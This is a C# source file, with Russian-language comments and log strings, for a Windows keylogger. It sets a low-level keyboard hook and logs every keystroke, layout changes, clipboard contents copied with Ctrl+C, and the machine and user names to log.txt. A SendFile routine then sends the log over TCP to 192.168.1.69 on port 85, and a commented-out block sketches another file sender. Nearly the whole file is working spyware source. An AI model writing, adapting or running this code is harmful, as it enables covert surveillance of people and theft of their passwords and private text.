using System;
using System.Windows;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using System.Net;
using System.Net.Sockets;


namespace ConsoleApplication1
{
    class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        public const int KF_REPEAT = 0X40000000;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        public static string? initLayout;
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        internal static extern short GetAsyncKeyState(int keyCode);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowThreadProcessId([In] IntPtr hWnd, [Out, Optional] IntPtr lpdwProcessId);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern ushort GetKeyboardLayout([In] int idThread);

        static ushort GetKeyboardLayout()
        {
            return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
        }

    [STAThread]
        static void Main(string[] args)
        {
            _hookID = SetHook(_proc);

            Writer("CurrentDirectory: {0}" + Environment.CurrentDirectory);
            Writer("MachineName: {0}" + Environment.MachineName);
            Writer("OSVersion: {0}" + Environment.OSVersion.ToString());
            Writer("SystemDirectory: {0}" + Environment.SystemDirectory);
            Writer("UserDomainName: {0}" + Environment.UserDomainName);
            Writer( "UserInteractive: {0}" + Environment.UserInteractive);
            Writer("UserName: {0}" + Environment.UserName);

            string htmlData = GetBuff();


            initLayout = GetKeyboardLayout().ToString();
            Writer("Первоначальная раскладка: " + initLayout);
            Thread mtr = new Thread(SendFile);
            mtr.Start();
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }


        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule? curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            Int32 msgType = wParam.ToInt32();
            if (nCode >= 0 && (msgType == 0x100 || msgType == 0x104))
            {
                bool shift = false;
                var caps = Console.CapsLock;
                short shiftState = GetAsyncKeyState((int)Keys.LShiftKey);
                int vkCode = Marshal.ReadInt32(lParam);
                if ((shiftState & 0x8000) == 0x8000)
                {
                    shift = true;
                }
                KeysConverter kc = new KeysConverter();
                string?key = kc.ConvertToString((Keys)vkCode);
                string mss_check = GetKeyboardLayout().ToString();

                if (initLayout != mss_check)
                {
                    Writer("\n<Смена раскладки:" + mss_check + " >\n");
                    initLayout = mss_check;
                }
                if (vkCode > 64 && vkCode < 91)
                {
                    if (shift | caps)
                    {
                        Writer(key);
                    }
                    else
                    {
                        Writer(key.ToLower());
                    }
                }
                else if (vkCode >= 96 && vkCode <= 111)
                {
                    switch (vkCode)
                    {
                        case 96: Writer("0"); break;
                        case 97: Writer("1"); break;
                        case 98: Writer("2"); break;
                        case 99: Writer("3"); break;
                        case 100: Writer("4"); break;
                        case 101: Writer("5"); break;
                        case 102: Writer("6"); break;
                        case 103: Writer("7"); break;
                        case 104: Writer("8"); break;
                        case 105: Writer("9"); break;
                        case 106: Writer("*"); break;
                        case 107: Writer("+"); break;
                        case 108: Writer("|"); break;
                        case 109: Writer("-"); break;
                        case 110: Writer("."); break;
                        case 111: Writer("/"); break;
                    }
                }
                else if ((vkCode >= 48 && vkCode <= 57) || (vkCode >= 186 && vkCode <= 192))
                {
                    if (shift)
                    {
                        switch (vkCode)
                        {
                            case 48: Writer(")"); break;
                            case 49: Writer("!"); break;
                            case 50: Writer("@"); break;
                            case 51: Writer("#"); break;
                            case 52: Writer("$"); break;
                            case 53: Writer("%"); break;
                            case 54: Writer("^"); break;
                            case 55: Writer("&"); break;
                            case 56: Writer("*"); break;
                            case 57: Writer("("); break;
                            case 186: Writer(":"); break;
                            case 187: Writer("+"); break;
                            case 188: Writer("<"); break;
                            case 189: Writer("_"); break;
                            case 190: Writer(">");break;
                            case 191: Writer("?"); break;
                            case 192: Writer("~"); break;
                            case 219: Writer("{");break;
                            case 220: Writer("|"); break;
                            case 221: Writer("}"); break;
                            case 222: Writer("\""); break;
                        }
                    }
                    else
                    {
                        switch (vkCode)
                        {
                            case 48: Writer("0"); break;
                            case 49: Writer("1"); break;
                            case 50: Writer("2"); break;
                            case 51: Writer("3"); break;
                            case 52: Writer("4"); break;
                            case 53: Writer("5"); break;
                            case 54: Writer("6"); break;
                            case 55: Writer("7"); break;
                            case 56: Writer("8"); break;
                            case 57: Writer("9"); break;
                            case 186: Writer(";"); break;
                            case 187: Writer("="); break;
                            case 188: Writer(","); break;
                            case 189: Writer("-"); break;
                            case 190: Writer("."); break;
                            case 191: Writer("/"); break;
                            case 192: Writer("`"); break;
                            case 219: Writer("["); break;
                            case 220: Writer("\\"); break;
                            case 221: Writer("]"); break;
                            case 222: Writer("'"); break;
                        }
                    }

                }
                if ((Keys)vkCode == Keys.Delete)
                    Writer("<Delete>");
                else if ((Keys)vkCode == Keys.Back)
                    Writer("<Backspace>");
                else if ((Keys)vkCode == Keys.Enter)
                    Writer("<Enter>");
                else if ((Keys)vkCode == Keys.Escape)
                    Writer("<Esc>");
                else if ((Keys)vkCode == Keys.Space)
                    Writer("<Space>");




                // ловим сочетание клавиш CTRL+C (копирование в буфер)
                if (Keys.C == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    string htmlData1 = GetBuff();                                                   
                    Writer("Содержимое буфера: " + htmlData1 + "\n");                
                    Writer("\n<COPY>\n");
                }

                else if (Keys.V == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    Writer("\n<PASTE>\n");
                }
                else if (Keys.Z == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    Writer("\n<Отмена>\n");
                }
                else if (Keys.F == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    Writer("\n<Искать>\n");
                }
                else if (Keys.A == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    Writer("\n<Выделить всё>\n");
                }
                else if (Keys.N == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    Writer("\n<Новый>\n");
                }
                else if (Keys.T == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    Writer("\n<Нов.вкладка>\n");
                }
                else if (Keys.X == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    Writer("\n<Вырезать>\n");
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        public static string GetBuff()
        {
            string htmlData = Clipboard.GetText(TextDataFormat.Text);
            return htmlData;
        }
        public static void SendFile()
        {
            System.Net.Sockets.TcpClient TcpClient = new System.Net.Sockets.TcpClient("192.168.1.69", 85);
            System.Net.Sockets.NetworkStream NetworkStream = TcpClient.GetStream();
            System.IO.Stream FileStream = System.IO.File.OpenRead(Application.StartupPath + @"\log.txt");
            byte[] FileBuffer = new byte[FileStream.Length];

            FileStream.Read(FileBuffer, 0, (int)FileStream.Length);
            NetworkStream.Write(FileBuffer, 0, FileBuffer.GetLength(0));
            NetworkStream.Close();
        }
        //public static  void ClientSocket()
        //{
        //    while (true)
        //    {
        //        {
        //            //using TcpClient tcpClient = new TcpClient();
                     
        //            try
        //            {
        //                //await tcpClient.ConnectAsync(IPAddress.Parse("192.168.1.69"), 82);
        //                //MessageBox.Show("Соединение прошло успешно!");
        //                //NetworkStream stream = tcpClient.GetStream();
        //                //await tcpClient.Send

        //                IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 9050);
        //                Socket newsock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        //                newsock.Bind(ipep);
        //                newsock.Listen(10);
        //                Socket client = newsock.Accept();
        //                IPEndPoint? clientep = (IPEndPoint)client.RemoteEndPoint;
        //                MessageBox.Show($"Connected with {clientep.Address} at port {clientep.Port}");
        //                // FileInfo fi = new FileInfo(Application.StartupPath + @"\log.dat");
        //                // string fsize= fi.Length.ToString();
        //                try
        //                {

        //                    client.SendFile(Application.StartupPath + @"\log.dat");
        //                    Console.WriteLine("Disconnected from {0}", clientep.Address);
        //                    client.Close();
        //                    newsock.Close();

        //                }
        //                catch (Exception ex)
        //                {
        //                    //MessageBox.Show(ex.Message);
        //                }
        //            }

        //            catch (Exception ex)
        //            {
        //                //MessageBox.Show(ex.Message);
        //            }


        //        }
        //    }

        //}



        public static void Writer(string inputstring)
        {
            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
            sw.WriteLine(inputstring+DateTime.Now.ToString(" - [yyyy-MM-dd]HH:mm:ss"));
            sw.Flush();
            sw.Close();
        }


    }
}